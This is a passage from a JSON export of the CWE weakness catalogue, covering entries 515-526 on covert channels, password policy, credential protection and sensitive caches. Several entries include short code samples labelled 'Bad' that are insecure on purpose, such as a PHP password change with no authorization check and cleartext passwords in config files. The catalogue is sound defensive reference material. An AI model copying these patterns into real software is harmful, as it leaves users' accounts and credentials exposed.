          "Note": "As of CWE 4.9, members of the CWE Hardware SIG are working to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks that create or exploit covert channels. As a result of that work, this entry might change in CWE 4.10."
        }
      ]
    },
    {
      "ID": "515",
      "Name": "Covert Storage Channel",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A covert storage channel transfers information through the setting of bits by one program and the reading of those bits by another. What distinguishes this case from that of ordinary operation is that the bits are used to convey encoded information.",
      "ExtendedDescription": "Covert storage channels occur when out-of-band data is stored in messages for the purpose of memory reuse. Covert channels are frequently classified as either storage or timing channels. Examples would include using a file intended to hold only audit information to convey user passwords--using the name of a file or perhaps status bits associated with it that can be read by all users to signal the contents of the file. Steganography, concealing information in such a manner that no one but the intended recipient knows of the existence of the message, is a good example of a covert storage channel.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "514",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "Covert storage channels may provide attackers with important information about the system in question."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "If these messages or packets are sent with unnecessary data contained within, it may tip off malicious listeners as to the process that created the message. With this information, attackers may learn any number of things, including the hardware platform, operating system, or algorithms used by the sender. This information can be of significant value to the user in launching further attacks."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Ensure that all reserved fields are set to zero before messages are sent and that no unnecessary information is included."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "An excellent example of covert storage channels in a well known application is the ICMP error message echoing functionality. Due to ambiguities in the ICMP RFC, many IP implementations use the memory within the packet for storage or calculation. For this reason, certain fields of certain packets -- such as ICMP error packets which echo back parts of received messages -- may contain flaws or extra information which betrays information about the identity of the target operating system. This information is then used to build up evidence to decide the environment of the target. This is the first crucial step in determining if a given system is vulnerable to a particular flaw and what changes must be made to malicious code to mount a successful attack."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Landwehr",
          "EntryName": "Storage"
        },
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Covert storage channel"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1431",
          "Authors": [
            "Carl E. Landwehr",
            "Alan R. Bull",
            "John P. McDermott",
            "William S. Choi"
          ],
          "Title": "A Taxonomy of Computer Program Security Flaws, with Examples",
          "PublicationYear": "1993",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "URL": "https://cwe.mitre.org/documents/sources/ATaxonomyofComputerProgramSecurityFlawswithExamples%5BLandwehr93%5D.pdf",
          "URLDate": "2024-05-09"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "As of CWE 4.9, members of the CWE Hardware SIG are working to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks that create or exploit covert channels. As a result of that work, this entry might change in CWE 4.10."
        }
      ]
    },
    {
      "ID": "516",
      "Name": "DEPRECATED: Covert Timing Channel",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Deprecated",
      "Description": "This weakness can be found at CWE-385.",
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This CWE has been deprecated.",
        "Comments": "See description and name for possible suggestions of other CWEs to consider.",
        "Reasons": [
          "Deprecated"
        ]
      }
    },
    {
      "ID": "520",
      "Name": ".NET Misconfiguration: Use of Impersonation",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Allowing a .NET application to run at potentially escalated levels of access to the underlying operating and file systems can be dangerous and result in various forms of attacks.",
      "ExtendedDescription": ".NET server applications can optionally execute using the identity of the user authenticated to the client. The intention of this functionality is to bypass authentication and access control checks within the .NET application code. Authentication is done by the underlying web server (Microsoft Internet Information Service IIS), which passes the authenticated token, or unauthenticated anonymous token, to the .NET application. Using the token to impersonate the client, the application then relies on the settings within the NTFS directories and files to control access. Impersonation enables the application, on the server running the .NET application, to both execute code and access resources in the context of the authenticated and authorized user.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "266",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Run the application with limited privilege to the underlying operating and file system."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "521",
      "Name": "Weak Password Requirements",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.",
      "ExtendedDescription": "Authentication mechanisms often rely on a memorized secret (also known as a password) to provide an assertion of identity for a user of a system. It is therefore important that this password be of sufficient complexity and impractical for an adversary to guess. The specific requirements around how complex a password needs to be depends on the type of system being protected. Selecting the correct password requirements and enforcing them through implementation are critical to the overall success of the authentication mechanism.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1391",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "287",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        },
        {
          "Phase": "Implementation",
          "Note": "Not enforcing the password policy stated in a products design can allow users to create passwords that do not provide the necessary level of protection."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "An attacker could easily guess user passwords and gain access user accounts."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nA product's design should require adherance to an appropriate password policy. Specific password requirements depend strongly on contextual factors, but it is recommended to contain the following attributes:\n\n\n  - Enforcement of a minimum and maximum length\n\n  - Restrictions against password reuse\n\n  - Restrictions against using common passwords\n\n  - Restrictions against using contextual string in the password (e.g., user id, app name)\n\nDepending on the threat model, the password policy may include several additional attributes.\n\n  - Complex passwords requiring mixed character sets (alpha, numeric, special, mixed case) \n   - Increasing the range of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication.\n\n   - Unfortunately, a complex password may be difficult to memorize, encouraging a user to select a short password or to incorrectly manage the password (write it down).\n\n   - Another disadvantage of this approach is that it often does not result in a significant increases in overal password complexity due to people's predictable usage of various symbols.\n\n\n\n  1. Large Minimum Length (encouraging passphrases instead of passwords) \n   - Increasing the number of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication.\n\n   - A disadvantage of this approach is that selecting a good passphrase is not easy and poor passwords can still be generated. Some prompting may be needed to encourage long un-predictable passwords.\n\n\n\n  1. Randomly Chosen Secrets \n   - Generating a password for the user can help make sure that length and complexity requirements are met, and can result in secure passwords being used.\n\n   - A disadvantage of this approach is that the resulting password or passpharse may be too difficult to memorize, encouraging them to be written down.\n\n\n\n  1. Password Expiration \n   - Requiring a periodic password change can reduce the time window that an adversary has to crack a password, while also limiting the damage caused by password exposures at other locations.\n\n   - Password expiration may be a good mitigating technique when long complex passwords are not desired.\n\n\n\nSee NIST 800-63B [REF-1053] for further information on password requirements."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Consider a second authentication factor beyond the password, which prevents the password from being a single point of failure. See CWE-308 for further information."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Consider implementing a password complexity meter to inform users when a chosen password meets the required attributes."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2020-4574",
          "Description": "key server application does not require strong passwords",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-4574"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A3",
          "EntryName": "Broken Authentication and Session Management",
          "MappingFit": "CWE More Specific"
        }
      ],
      "RelatedAttackPatterns": [
        "112",
        "16",
        "49",
        "509",
        "55",
        "555",
        "561",
        "565",
        "70"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 19: Use of Weak Password-Based Systems.\" Page 279",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        },
        {
          "ExternalReferenceID": "REF-1053",
          "Section": "Sections: 5.1.1, 10.2.1, and Appendix A",
          "Authors": [
            "NIST"
          ],
          "Title": "Digital Identity Guidelines (SP 800-63B)",
          "PublicationYear": "2017",
          "PublicationMonth": "06",
          "URL": "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "522",
      "Name": "Insufficiently Protected Credentials",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1390",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "287",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "An attacker could gain access to user accounts and access sensitive data used by the user accounts."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use an appropriate security mechanism to protect the credentials."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Make appropriate use of cryptography to protect the credentials."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use industry standards to protect the credentials (e.g. LDAP, keystore, etc.)."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-56",
          "Entries": [
            {
              "IntroText": "This code changes a user's password."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$user = $_GET['user'];\n\t$pass = $_GET['pass'];\n\t$checkpass = $_GET['checkpass'];\n\tif ($pass == $checkpass) {\n\t\tSetUserPassword($user, $pass);\n\t}\n```"
            },
            {
              "BodyText": "While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account."
            }
          ]
        },
        {
          "ID": "DX-57",
          "Entries": [
            {
              "IntroText": "The following code reads a password from a properties file and uses the password to connect to a database."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t...\n\tProperties prop = new Properties();\n\tprop.load(new FileInputStream(\"config.properties\"));\n\tString password = prop.getProperty(\"password\");\n\tDriverManager.getConnection(url, usr, password);\n\t...\n```"
            },
            {
              "BodyText": "This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system."
            }
          ]
        },
        {
          "ID": "DX-58",
          "Entries": [
            {
              "IntroText": "The following code reads a password from the registry and uses the password to create a new network credential."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t...\n\tString password = regKey.GetValue(passKey).toString();\n\tNetworkCredential netCred = new NetworkCredential(username,password,domain);\n\t...\n```"
            },
            {
              "BodyText": "This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system"
            }
          ]
        },
        {
          "ID": "DX-59",
          "Entries": [
            {
              "IntroText": "Both of these examples verify a password by comparing it to a stored compressed version."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint VerifyAdmin(char *password) {\n\t\tif (strcmp(compress(password), compressed_password)) {\n\t\t\tprintf(\"Incorrect Password!\\n\");\n\t\t\treturn(0);\n\t\t}\n\t\tprintf(\"Entering Diagnostic Mode...\\n\");\n\t\treturn(1);\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tint VerifyAdmin(String password) {\n\t\tif (passwd.Equals(compress(password), compressed_password)) {\n\t\t\treturn(0);\n\t\t}\n```\n//Diagnostic Mode* \n\t\treturn(1);}"
            },
            {
              "BodyText": "Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database."
            }
          ]
        },
        {
          "ID": "DX-43",
          "Entries": [
            {
              "IntroText": "The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext."
            },
            {
              "BodyText": "This Java example shows a properties file with a cleartext username / password pair."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n```\n# Java Web App ResourceBundle properties file* \n\t...\n\twebapp.ldap.username=secretUsername\n\twebapp.ldap.password=secretPassword\n\t..."
            },
            {
              "BodyText": "The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext."
            },
            {
              "Nature": "Bad",
              "Language": "ASP.NET",
              "ExampleCode": "```\n\t...\n\t<connectionStrings>\n\t\t<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />\n\t</connectionStrings>\n\t...\n```"
            },
            {
              "BodyText": "Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
            }
          ]
        },
        {
          "ID": "DX-153",
          "Entries": [
            {
              "IntroText": "In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were \"insecure by design\" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications."
            },
            {
              "BodyText": "Multiple vendors used cleartext transmission or storage of passwords in their OT products."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-30018",
          "Description": "A messaging platform serializes all elements of User/Group objects, making private information available to adversaries",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30018"
        },
        {
          "Reference": "CVE-2022-29959",
          "Description": "Initialization file contains credentials that can be decoded using a \"simple string transformation\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-29959"
        },
        {
          "Reference": "CVE-2022-35411",
          "Description": "Python-based RPC framework enables pickle functionality by default, allowing clients to unpickle untrusted data.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-35411"
        },
        {
          "Reference": "CVE-2022-29519",
          "Description": "Programmable Logic Controller (PLC) sends sensitive information in plaintext, including passwords and session tokens.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-29519"
        },
        {
          "Reference": "CVE-2022-30312",
          "Description": "Building Controller uses a protocol that transmits authentication credentials in plaintext.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30312"
        },
        {
          "Reference": "CVE-2022-31204",
          "Description": "Programmable Logic Controller (PLC) sends password in plaintext.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-31204"
        },
        {
          "Reference": "CVE-2022-30275",
          "Description": "Remote Terminal Unit (RTU) uses a driver that relies on a password stored in plaintext.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30275"
        },
        {
          "Reference": "CVE-2007-0681",
          "Description": "Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0681"
        },
        {
          "Reference": "CVE-2000-0944",
          "Description": "Web application password change utility doesn't check the original password.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0944"
        },
        {
          "Reference": "CVE-2005-3435",
          "Description": "product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3435"
        },
        {
          "Reference": "CVE-2005-0408",
          "Description": "chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0408"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2007",
          "EntryID": "A7",
          "EntryName": "Broken Authentication and Session Management",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A3",
          "EntryName": "Broken Authentication and Session Management",
          "MappingFit": "CWE More Specific"
        }
      ],
      "RelatedAttackPatterns": [
        "102",
        "474",
        "50",
        "509",
        "551",
        "555",
        "560",
        "561",
        "600",
        "644",
        "645",
        "652",
        "653"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 19: Use of Weak Password-Based Systems.\" Page 279",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        },
        {
          "ExternalReferenceID": "REF-1283",
          "Authors": [
            "Forescout Vedere Labs"
          ],
          "Title": "OT:ICEFALL: The legacy of \"insecure by design\" and its implications for certifications and risk management",
          "PublicationYear": "2022",
          "PublicationMonth": "06",
          "PublicationDay": "20",
          "URL": "https://www.forescout.com/resources/ot-icefall-report/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "523",
      "Name": "Unprotected Transport of Credentials",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Login pages do not use adequate measures to protect the user name and password while they are in transit from the client to the server.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "522",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanAlsoBe",
          "CweID": "312",
          "ViewID": "1000"
        }
      ],
      "BackgroundDetails": [
        "SSL (Secure Socket Layer) provides data confidentiality and integrity to HTTP. By encrypting HTTP messages, SSL protects from attackers eavesdropping or altering message contents."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Operation",
            "System Configuration"
          ],
          "Description": "Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "RelatedAttackPatterns": [
        "102"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "524",
      "Name": "Use of Cache Containing Sensitive Information",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code uses a cache that contains sensitive information, but the cache can be read by an actor outside of the intended control sphere.",
      "ExtendedDescription": "Applications may use caches to improve efficiency when communicating with remote entities or performing intensive calculations. A cache maintains a pool of objects, threads, connections, pages, financial data, passwords, or other resources to minimize the time it takes to initialize and access these resources. If the cache is accessible to unauthorized actors, attackers can read the cache and obtain this sensitive information.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Protect information stored in cache."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not store unnecessarily sensitive information in the cache."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Consider using encryption in the cache."
        }
      ],
      "RelatedAttackPatterns": [
        "204"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "525",
      "Name": "Use of Web Browser Cache Containing Sensitive Information",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The web application does not use an appropriate caching policy that specifies the extent to which each web page and associated form fields should be cached.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "524",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "Browsers often store information in a client-side cache, which can leave behind sensitive information for other users to find and exploit, such as passwords or credit card numbers. The locations at most risk include public terminals, such as those in libraries and Internet cafes."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Protect information stored in cache."
        },
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "Use a restrictive caching policy for forms and web pages that potentially contain sensitive information."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not store unnecessarily sensitive information in the cache."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Consider using encryption in the cache."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A2",
          "EntryName": "Broken Access Control",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A3",
          "EntryName": "Broken Authentication and Session Management",
          "MappingFit": "CWE More Specific"
        }
      ],
      "RelatedAttackPatterns": [
        "37"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "526",
      "Name": "Cleartext Storage of Sensitive Information in an Environment Variable",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses an environment variable to store unencrypted sensitive information.",
      "ExtendedDescription": "Information stored in an environment variable can be accessible by other processes with the execution context, including child processes that dependencies are executed in, or serverless functions in cloud environments. An environment variable's contents can also be inserted into messages, headers, log files, or other outputs. Often these other dependencies have no need to use the environment variable in question. A weakness that discloses environment variables could expose this information.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "312",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "214",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Encrypt information stored in the environment variable to protect it from being exposed to an unauthorized user. If encryption is not feasible or is considered too expensive for the business use of the application, then consider using a properly protected configuration file instead of an environment variable. It should be understood that unencrypted information in a config file is also not guaranteed to be protected, but it is still a better choice, because it reduces attack surface related to weaknesses such as CWE-214. In some settings, vaults might be a feasible option for safer data transfer. Users should be notified of the business choice made to not protect the sensitive information through encryption."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If the environment variable is not necessary for the desired behavior, then remove it entirely, or clear it to an empty value."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-43691",
          "Description": "CMS shows sensitive server-side information from environment variables when run in Debug mode.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-43691"
        },
